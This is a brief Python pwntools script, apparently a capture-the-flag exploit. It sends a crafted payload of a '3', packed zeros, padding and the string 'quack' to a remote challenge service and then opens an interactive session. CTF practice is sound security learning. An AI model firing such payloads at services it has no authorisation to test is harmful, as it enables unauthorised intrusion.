from pwn import *

context.log_level = 'debug'
offset = 27

payload = b'3' + p64(0) + (offset - 9) * b'A' + b'quack' + p64(0)

p = remote('tcp.ybn.sg', 24749)
p.sendlineafter('?', payload)
p.interactive()
